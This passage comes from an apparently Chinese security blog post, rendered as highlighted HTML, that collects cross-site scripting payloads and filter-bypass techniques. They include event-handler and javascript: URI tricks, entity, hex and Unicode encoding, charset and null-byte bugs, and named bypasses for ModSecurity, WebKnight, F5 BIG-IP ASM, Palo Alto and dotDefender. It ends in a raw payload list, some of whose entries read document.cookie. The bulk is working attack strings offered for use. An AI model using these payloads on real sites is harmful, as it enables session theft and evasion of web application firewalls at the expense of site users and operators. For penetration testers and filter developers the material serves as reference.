class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="pun"</span>&gt;</span>=<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="atv"</span>&gt;</span>&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="tag"</span>&gt;</span>&amp;gt;&amp;lt;button&amp;gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="pln"</span>&gt;</span>CLICK<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined">“formaction”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindexformaction="javascript:alert(1)"</span>     <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">formaction</span>=<span class="string">JaVaScript:alert(0)</span>&gt;</span></span></span><br><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">buttonformaction=javascript&amp;colon;alert(1)</span>&gt;</span>CLICKME</span></span><br><span class="line"><span class="undefined">“background”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> // Works on Opera10.5      and IE6</span></span><br><span class="line"><span class="undefined">“posters” 属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">poster</span>=<span class="string">javascript:alert(1)//</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // Works Upto Opera10.5</span></span><br><span class="line"><span class="undefined">“data”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;object/data=<span class="comment">//goo.gl/nlX0P?</span></span></span><br><span class="line"><span class="undefined">“code”属性</span></span><br><span class="line"><span class="javascript">&lt;applet code=<span class="string">"javascript:confirm(document.cookie);"</span>&gt; <span class="comment">// FirefoxOnly</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">embed</span>  <span class="attr">code</span>=<span class="string">"http://businessinfo.co.uk/labs/xss/xss.swf"</span>     <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span></span></span><br><span class="line"><span class="undefined">事件处理</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span>/</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span></span><br><span class="line"><span class="undefined">短payload</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">q</span>/<span class="attr">oncut</span>=<span class="string">open()</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">q</span>/<span class="attr">oncut</span>=<span class="string">alert(1)</span>&gt;</span> //      Useful in-case of payloadrestrictions.</span></span><br><span class="line"><span class="undefined">嵌套欺骗</span></span><br><span class="line"><span class="undefined">&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>  <span class="attr">language</span>=<span class="string">vbsonload</span>=<span class="string">alert-1</span> // <span class="attr">Works</span> <span class="attr">with</span> <span class="attr">IE8</span></span></span></span><br><span class="line"><span class="javascript">&lt;commandonmouseover=<span class="string">"\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6  9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"</span>&gt;Save&lt;<span class="regexp">/command&gt;     /</span><span class="regexp">/ Works with IE8</span></span></span><br><span class="line"><span class="undefined">圆括号被过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"javascript:window.onerror=alert;throw 1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"javascript:window.onerror=alert;throw 1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">javascript:window.onerror</span>=<span class="string">eval;throw&amp;#039;</span>=<span class="string">alert\x281\x29&amp;#039;;</span></span></span></span><br><span class="line"><span class="undefined">Expression 属性</span></span><br><span class="line"><span class="javascript">&lt;img style=<span class="string">"xss:expression(alert(0))"</span>&gt; <span class="comment">// Works upto IE7.</span></span></span><br><span class="line"><span class="javascript">&lt;div style=<span class="string">"color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>     <span class="comment">// Works upto IE7.</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-id">#test</span>&#123;<span class="attribute">x</span>:<span class="built_in">expression</span>(alert(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>     // Works upto IE7</span></span><br><span class="line"><span class="undefined">“location”属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">location</span>=<span class="string">’javascript:alert(1)</span>&gt;</span>click</span></span><br><span class="line"><span class="undefined">&lt;body onfocus="location=&amp;#039;javascrpt:alert(1) &gt;123</span></span><br><span class="line"><span class="undefined">其他Payload</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>     <span class="attr">content</span>=<span class="string">"0;url=//goo.gl/nlX0P"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>     <span class="attr">content</span>=<span class="string">"0;javascript&amp;colon;alert(1)"</span>/&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">g</span>     <span class="attr">onload</span>=<span class="string">"javascript:\u0061lert(1);"</span>&gt;</span><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span> <span class="comment">//     By @secalert</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:xlink</span>=<span class="string">" r=100 /&gt;&lt;animateattributeName="</span><span class="attr">xlink:href</span>"     <span class="attr">values</span>=<span class="string">";javascript:alert(1)"</span> <span class="attr">begin</span>=<span class="string">"0s"</span>     <span class="attr">dur</span>=<span class="string">"0.1s"</span> <span class="attr">fill</span>=<span class="string">"freeze"</span>/&gt;</span> // By Mario</span></span><br><span class="line"><span class="undefined">&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt;     // By @secalert</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)"</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"//jsfiddle.NET/t846h/"</span>&gt;</span>click // ByAshar Javed</span></span><br><span class="line"><span class="undefined">（）；：被过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40/1/&amp;#41</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>     // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line"> ) is html encoded to &amp;#41</span><br><span class="line">Opera的变量</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40      1&amp;#41 // Workswith Opera Only</span></span><br><span class="line"><span class="undefined">实体解码</span></span><br><span class="line"><span class="javascript">&amp;lt;<span class="regexp">/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/</span>script&amp;gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">编码</span></span><br><span class="line"><span class="undefined">JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码</span></span><br><span class="line"><span class="undefined">（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</span></span><br><span class="line"><span class="undefined">href=</span></span><br><span class="line"><span class="undefined">action=</span></span><br><span class="line"><span class="undefined">formaction=</span></span><br><span class="line"><span class="undefined">location=</span></span><br><span class="line"><span class="undefined">on*=</span></span><br><span class="line"><span class="undefined">name=</span></span><br><span class="line"><span class="undefined">background=</span></span><br><span class="line"><span class="undefined">poster=</span></span><br><span class="line"><span class="undefined">src=</span></span><br><span class="line"><span class="undefined">code=</span></span><br><span class="line"><span class="javascript">data= <span class="comment">//只支持base64</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.4 基于上下文的过滤</span></span><br><span class="line"><span class="undefined">WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.4.1 输入反射属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inputvalue="XSStest"</span> <span class="attr">type</span>=<span class="string">text</span>&gt;</span></span></span><br><span class="line"><span class="javascript">我们可以使用 “&gt;<span class="xml"><span class="tag">&lt;<span class="name">imgsrc=x</span>  <span class="attr">onerror</span>=<span class="string">prompt(0);</span>&gt;</span>触发，但是如果<span class="tag">&lt;&gt;</span>被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onmouseover="</span>prompt(<span class="number">0</span>) x=<span class="string">"</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onfocusin=alert(1)     autofocus x="</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onfocusout=alert(1)     autofocus x="</span></span></span><br><span class="line"><span class="javascript"><span class="string">" onblur=alert(1) autofocus     a="</span></span></span><br><span class="line"><span class="xml">输入反射在<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">标签内</span></span></span><br><span class="line"><span class="undefined">类似这种情况：</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">Var</span></span><br><span class="line"><span class="undefined">x=”Input”;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">通常，我们使用“&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>,闭合前面的<span class="tag">&lt;/<span class="name">script</span>&gt;</span>标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()</span><br><span class="line">confirm() ，例如：</span><br><span class="line">“;alert(1)//</span><br><span class="line">    </span><br><span class="line">2.4.3 超文本内容</span><br><span class="line">代码中的情况如下</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">”Userinput”</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">可以使用javascript:alert(1)//直接执行<span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">”javascript:alert(1)//”</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.4.4 变形</span><br><span class="line">主要包含大小写和JavaScript变形</span><br><span class="line">javascript&amp;#058;alert(1)</span><br><span class="line">javaSCRIPT&amp;colon;alert(1)</span><br><span class="line">JaVaScRipT:alert(1)</span><br><span class="line">javas&amp;Tab;cript:\u0061lert(1);</span><br><span class="line">javascript:\u0061lert&amp;#x28;1&amp;#x29</span><br><span class="line">avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;     // AsharJaved</span><br><span class="line">IE10以下和URI中可以使用VBScript</span><br><span class="line">vbscript:alert(1);</span><br><span class="line">vbscript&amp;#058;alert(1);</span><br><span class="line">vbscr&amp;Tab;ipt:alert(1)"</span><br><span class="line">Data URl</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">    </span><br><span class="line">2.4.5JSON内容</span><br><span class="line">反射输入</span><br><span class="line">encodeURIComponent(&amp;#039;userinput&amp;#039;)</span><br><span class="line">可以使用</span><br><span class="line">-alert(1)-</span><br><span class="line">-prompt(1)-</span><br><span class="line">-confirm(1)-</span><br><span class="line">结果</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)</span><br><span class="line">encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)</span><br><span class="line"></span><br><span class="line">2.4.6 输入反射在svg标签内</span><br><span class="line">源码如下：</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">varmyvar=”YourInput”;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">可以输入</span><br><span class="line">www.site.com/test.PHP?var=text”;alert(1)//</span><br><span class="line">如果系统编码了”字符</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">varmyvar=<span class="string">"text&amp;quot;;alert(1)//"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理</span><br><span class="line">浏览器BUG</span><br><span class="line">    </span><br><span class="line">2.4.7 字符集BUG</span><br><span class="line">字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。</span><br><span class="line">示例</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</span><br><span class="line">可以控制编码，提交</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;<span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(0);</span>&gt;</span></span><br><span class="line">可以修改为UTF-32编码形式</span><br><span class="line">???script?alert(1)?/script?</span><br><span class="line">http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span><br><span class="line">    </span><br><span class="line">2.4.8 空字节</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line"><span class="tag">&lt;<span class="name">scri%00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scri\x00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span>confirm(0);<span class="tag">&lt;/<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span></span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line">    </span><br><span class="line">2.4.9 语法BUG</span><br><span class="line">RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%0ascript</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%0bscript</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</span><br><span class="line"><span class="tag">&lt;//     <span class="attr">style</span>=<span class="string">x:expression\28write(1)\29</span>&gt;</span> // Works upto IE7 参考http://html5sec.org/#71</span><br><span class="line"><span class="comment">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script     --&gt;</span> // Worksupto IE9 参考http://html5sec.org/#115</span><br><span class="line"><span class="meta">&lt;?xml-stylesheet     type="text/css"?&gt;</span><span class="tag">&lt;<span class="name">root</span>    <span class="attr">style</span>=<span class="string">"x:expression(write(1))"</span>/&gt;</span> // Works in IE7 参考http://html5sec.org/#77</span><br><span class="line"><span class="tag">&lt;<span class="name">%div%20style=xss:expression(prompt(1))</span>&gt;</span>     // Works Upto IE7</span><br><span class="line">    </span><br><span class="line">2.4.10Unicode分隔符</span><br><span class="line">[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：</span><br><span class="line">IExplorer=     [0x09,0x0B,0x0C,0x20,0x3B]</span><br><span class="line">Chrome =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Safari = [0x2C,0x3B]</span><br><span class="line">FireFox=     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">Opera = [0x09,0x20,0x2C,0x3B]</span><br><span class="line">Android =     [0x09,0x20,0x28,0x2C,0x3B]</span><br><span class="line">x0b在Mod_security中已经被过滤，绕过的方法：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">onmouseover</span>[\<span class="attr">x0b</span>]=<span class="string">location</span>=<span class="string">&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;</span>&gt;</span>rhainfosec</span><br><span class="line"></span><br><span class="line">2.4.11缺少X-frame选项</span><br><span class="line">通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞</span><br><span class="line">Docmodes</span><br><span class="line">IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式</span><br><span class="line">expression(open(alert(1)))</span><br><span class="line">以下POC可以插入到IE7中</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span><span class="attr">content</span>=<span class="string">"IE=EmulateIE7"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframesrc="https:</span>//<span class="attr">targetwebsite.com</span>"&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.4.12Window.name欺骗</span><br><span class="line">情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码</span><br><span class="line">POC</span><br><span class="line"><span class="tag">&lt;<span class="name">iframesrc=&amp;#039;http:</span>//<span class="attr">www.target.com</span>?<span class="attr">foo</span>=<span class="string">"xss autofocus/AAAAA  onfocus=location=window.name//&amp;#039;</span></span></span><br><span class="line"><span class="tag"><span class="string">name="</span><span class="attr">javascript:alert</span>("<span class="attr">XSS</span>")"&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">DOM型XSS</span><br><span class="line">服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    vari=location.hash;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(i);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">在一些情况下，反射型XSS可以转换成DOM型XSS：</span><br><span class="line">http://www.target.com/xss.php?foo=<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">location</span>=<span class="string">/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</span></span></span><br><span class="line"><span class="tag">上面的<span class="attr">POC</span>只在[<span class="attr">.</span>+都被允许的情况下适用，可以使用<span class="attr">location.hash</span>注入任何不允许的编码</span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">1</span>] = <span class="string">:</span>  // <span class="attr">Defined</span> <span class="attr">at</span> <span class="attr">the</span> <span class="attr">first</span> <span class="attr">position</span> <span class="attr">after</span>    <span class="attr">the</span> <span class="attr">hash.</span></span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">2</span>]= <span class="string">(</span>  // <span class="attr">Defined</span> <span class="attr">at</span> <span class="attr">the</span> <span class="attr">second</span> <span class="attr">position</span> <span class="attr">after</span>    <span class="attr">the</span> <span class="attr">has</span></span></span><br><span class="line"><span class="tag"><span class="attr">Location.hash</span>[<span class="attr">3</span>] = <span class="string">)</span> // <span class="attr">Defined</span>     <span class="attr">at</span> <span class="attr">third</span> <span class="attr">position</span> <span class="attr">after</span> <span class="attr">the</span> <span class="attr">hash.</span></span></span><br><span class="line"><span class="tag">如果有客户端过滤可能不适用</span></span><br><span class="line"><span class="tag">    </span></span><br><span class="line"><span class="tag"><span class="attr">2.4.13ModSecurity</span>绕过</span></span><br><span class="line">&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">onmouseover</span>[\<span class="attr">x0b</span>]=<span class="string">location</span>=<span class="string">&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;</span>&gt;</span>rhainfosec</span><br><span class="line">参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</span><br><span class="line">    </span><br><span class="line">2.4.14WEB KNIGHT绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span></span><br><span class="line">F5 BIG IP ASM and Palo ALTO绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //IE6或者低版本Opera</span><br><span class="line">    “/&gt;<span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onfinish</span>=<span class="string">confirm(123)</span>&gt;</span>a<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">Dot Defender绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">"javas&amp;tab;cript:alert(1)"</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span>/<span class="attr">onstart</span>=<span class="string">confirm(2)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS-Payload杂烩"><a href="#XSS-Payload杂烩" class="headerlink" title="XSS Payload杂烩"></a>XSS Payload杂烩</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">='&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(vulnerable)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">%3Cscript%3Ealert('XSS')%3C/script%3E</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(\"Vulnerable\")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span 